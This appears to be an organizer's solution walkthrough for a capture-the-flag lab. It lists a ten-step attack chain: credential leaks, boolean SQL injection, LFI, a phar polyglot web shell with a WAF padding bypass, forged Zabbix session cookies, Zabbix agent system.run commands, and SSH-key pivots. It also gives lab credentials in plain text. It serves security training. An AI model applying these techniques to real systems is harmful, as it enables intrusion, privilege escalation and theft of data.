# SOLUTIONS (organizers — full spoilers)

The authoritative, always-current solution is the reference solver
[`attack/solve.py`](attack/solve.py): `make up-dev && make solve` drives all ten
steps and prints PASS/FAIL. This file is the human-readable companion; exact
hosts, creds and fixed values are in [`docs/ctf-design.md`](docs/ctf-design.md).

Player path (perimeter-only start; steps 6–10 run from the web-shell pivot):

1. **Recon.** `GET http://mobapp…/` → download `/download/atb-market.apk`, `unzip`
   it and `strings assets/index.android.bundle` → Basic `reg_user:basic*88password!prod99`.
   `POST http://education…/md/blocks/moco_news/ajax.php` body `procedure=getPosts`
   → leaks `education@atbmarket.com:Edu003868$`, Moodle DB creds, salt.
2. **SQLi.** Catalog filter key `filter[8][<payload>]` on `/shop/catalog/novetly`
   is a boolean oracle: clean key → 200, broken/false → 500. Dump `ishop.users`.
3. **Supplier.** `entryPoint=RegistrationStep3`, then `GeneratePassword` with
   `link=1` returns the reset GUID, then `Changenewpassword&guid=…`.
4. **LFI.** `module=Import&action=RefreshMapping` with `importFile=/var/www/config_override.php`
   (Oracle DSNs + Blowfish mailbox pw), `config.php` (supplier DB), `/etc/hostname`.
5. **Web-shell.** Upload a PNG+phar polyglot as an attachment, trigger
   `importFile=phar://upload/<file>/x` behind 200 KB of padding (past the 180 KB
   WAF window) → `/upload/shell.php?z=<base64 cmd>` or the clickable `/shell`
   terminal. You are now `nginx` on `sp-web-p01`, inside the network — pivot.
6. **Grafana → Zabbix → root.** Log into Grafana (internal) with
   `education@atbmarket.com:Edu003868$`. In Explore run SQL on the "Zabbix DB"
   data source (over-privileged user):
   `SELECT session_key FROM config` then
   `INSERT INTO sessions (sessionid,userid,lastaccess,status,secret) VALUES ('<32hex>',1,UNIX_TIMESTAMP(),0,'')`.
   Forge the cookie: `zbx_session = base64('{"sessionid":"<sid>","sign":"<hmac>"}')`
   where `sign = HMAC-SHA256(session_key, '{"sessionid":"<sid>"}')`. Set it, open
   Zabbix → Administration → Scripts → create `id; hostname`, run on a host → root
   on `zb-app-p01`. (Headless: `POST /api_jsonrpc.php` `script.create`.)
7. **Keys.** From the network, ZBXD to Jenkins: `system.run[cat /mnt/BACKUP/root.tar.gz | base64]`,
   decode → `root/.ssh/id_rsa_root` → `ssh root@bastion-main-p01`.
8. **Databases.** Oracle mocks `erpdb:1581 / retaildb:1521 / ISMEDOC-DB:1251` with
   the step-4 creds (`oracle_probe.py` is on the supplier box). Harbor image env
   (`/image/<repo>/env` or the Build-History UI) leaks the ishop MySQL and
   store-plus Postgres creds. AD bind `education@atbmarket.com:Edu003868$`.
9. **Mail.** Blowfish value → `supplier@atbmarket.com:supplier123569` → OWA
   (`/owa`) inbox, or EWS `POST /ews/Exchange.asmx` with `attack/ews_finditem.xml`.
10. **Source.** `ssh root@gitlab-p01` with the recovered key → 524 repos.
